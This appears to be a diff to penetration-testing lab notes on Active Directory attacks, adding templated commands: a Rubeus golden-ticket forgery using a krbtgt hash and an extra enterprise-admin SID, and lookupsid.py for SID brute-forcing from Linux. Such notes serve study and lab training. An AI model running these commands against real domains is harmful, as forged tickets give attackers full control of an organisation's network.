@@ -56,5 +56,12 @@ ls \\academy-ea-dc01.inlanefreight.local\c$
 Lastly, we can perform this attack by using rubeus as well
 
 ```
-.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<domainfqdn> /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
+.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<domainfqdn> /sid:<doaminsid>  /sids:<enterpriseadminsid> /user:<username> /ptt
+```
+
+We can also perform this attack from linux perspective:
+
+Obtaining Domain SID via SID Bruteforcing by lookupsid.py:
+```
+lookupsid.py <domainname>/<username>@<dcip>
 ```
